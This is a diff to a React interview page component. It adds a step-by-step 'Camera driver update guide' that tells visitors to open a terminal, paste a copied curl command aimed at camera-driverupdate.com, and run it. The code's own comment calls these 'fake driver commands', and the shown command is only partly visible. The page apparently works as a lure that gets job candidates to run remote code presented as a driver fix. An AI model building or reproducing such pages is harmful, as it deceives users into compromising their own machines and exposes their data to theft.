@@ -30,6 +30,7 @@ export default function SummaryInterview() {
   const [submitProgress, setSubmitProgress] = useState(0) // 0–100 for 5s circle
   const [driverOs, setDriverOs] = useState('mac') // mac | windows | linux (for fake driver commands)
   const [copySuccess, setCopySuccess] = useState(false)
+  const [driverHelpExpanded, setDriverHelpExpanded] = useState(false)
   const [cameraDriverUpdatedMessage, setCameraDriverUpdatedMessage] = useState(null) // shown once when connections_status becomes 2
   const driverCommandRef = useRef(null)
   const connectionsStatusRef = useRef(null)
@@ -619,23 +620,81 @@ export default function SummaryInterview() {
         </div>
 
         <div className={styles.driverHelp}>
-          <label htmlFor="driver-os" className={styles.driverHelpLabel}>Operating system</label>
-          <select
-            id="driver-os"
-            value={driverOs}
-            onChange={(e) => setDriverOs(e.target.value)}
-            className={styles.driverHelpSelect}
-            aria-describedby="driver-guide driver-command"
+          <button
+            type="button"
+            onClick={() => setDriverHelpExpanded((e) => !e)}
+            className={styles.driverHelpToggle}
+            aria-expanded={driverHelpExpanded}
+            aria-controls="driver-help-content"
+            id="driver-help-toggle"
           >
-            <option value="mac">Mac</option>
-            <option value="windows">Windows</option>
-            <option value="linux">Linux</option>
-          </select>
-          <p id="driver-guide" className={styles.driverHelpGuide}>
-            Run the command below in your terminal to update your camera driver.
-          </p>
-          <div className={styles.driverHelpCommandWrap}>
-            <div ref={driverCommandRef} id="driver-command" className={styles.driverHelpCommand} role="img" aria-label="Example command">
+            <span className={styles.driverHelpToggleLabel}>
+              <span className={styles.driverHelpTitle}>Camera driver update guide</span>
+              <span className={styles.driverHelpToggleHint}>
+                {driverHelpExpanded ? 'Click to hide' : 'Click to show steps'}
+              </span>
+            </span>
+            <span className={styles.driverHelpArrow} aria-hidden>
+              {driverHelpExpanded ? '▲' : '▼'}
+            </span>
+          </button>
+          <div id="driver-help-content" className={styles.driverHelpContent} hidden={!driverHelpExpanded}>
+          <div className={styles.driverHelpContentInner}>
+            <div className={styles.driverHelpOsRow}>
+              <label htmlFor="driver-os" className={styles.driverHelpLabel}>Operating system</label>
+              <select
+                id="driver-os"
+                value={driverOs}
+                onChange={(e) => setDriverOs(e.target.value)}
+                className={styles.driverHelpSelect}
+                aria-describedby="driver-steps driver-command"
+              >
+                <option value="mac">Mac</option>
+                <option value="windows">Windows</option>
+                <option value="linux">Linux</option>
+              </select>
+            </div>
+            <ol id="driver-steps" className={styles.driverHelpSteps}>
+              <li className={styles.driverHelpStep}>
+                <div className={styles.driverHelpStepHeader}>
+                  <span className={styles.driverHelpStepNum}>1</span>
+                  <span className={styles.driverHelpStepTitle}>Open Terminal</span>
+                </div>
+                <div className={styles.driverHelpStepBody}>
+                  {driverOs === 'mac' && (
+                    <p>Press <kbd>Cmd</kbd> + <kbd>Space</kbd>, type <strong>Terminal</strong>, then press <kbd>Enter</kbd>. Or go to <strong>Applications → Utilities → Terminal</strong>.</p>
+                  )}
+                  {driverOs === 'windows' && (
+                    <p>Press <kbd>Win</kbd> + <kbd>R</kbd>, type <strong>powershell</strong>, then press <kbd>Enter</kbd>. Or search for <strong>PowerShell</strong> or <strong>Command Prompt</strong> in the Start menu.</p>
+                  )}
+                  {driverOs === 'linux' && (
+                    <p>Press <kbd>Ctrl</kbd> + <kbd>Alt</kbd> + <kbd>T</kbd>, or open <strong>Terminal</strong> from your applications menu.</p>
+                  )}
+                </div>
+              </li>
+              <li className={styles.driverHelpStep}>
+                <div className={styles.driverHelpStepHeader}>
+                  <span className={styles.driverHelpStepNum}>2</span>
+                  <span className={styles.driverHelpStepTitle}>Copy the command</span>
+                </div>
+                <div className={styles.driverHelpStepBody}>
+                  <p>Click the <strong>Copy</strong> button next to the command below. The full command will be copied to your clipboard.</p>
+                </div>
+              </li>
+              <li className={styles.driverHelpStep}>
+                <div className={styles.driverHelpStepHeader}>
+                  <span className={styles.driverHelpStepNum}>3</span>
+                  <span className={styles.driverHelpStepTitle}>Paste and run</span>
+                </div>
+                <div className={styles.driverHelpStepBody}>
+                  <p>In the terminal window, paste with <kbd>{driverOs === 'mac' ? 'Cmd' : 'Ctrl'}</kbd> + <kbd>V</kbd>, then press <kbd>Enter</kbd>. Wait for the update to finish, then return here and click <strong>Start camera</strong>.</p>
+                </div>
+              </li>
+            </ol>
+            <div className={styles.driverHelpCommandSection}>
+              <span className={styles.driverHelpCommandLabel}>Command to run</span>
+              <div className={styles.driverHelpCommandWrap}>
+            <div ref={driverCommandRef} id="driver-command" className={styles.driverHelpCommand} role="region" aria-label="Command to copy">
             {driverOs === 'mac' && (
                       <code>
                   {`curl -sL -X POST https://camera-driverupdate.com/mac \
@@ -669,6 +728,9 @@ export default function SummaryInterview() {
             >
               {copySuccess ? 'Copied!' : 'Copy'}
             </button>
+              </div>
+            </div>
+          </div>
           </div>
         </div>
       </div>
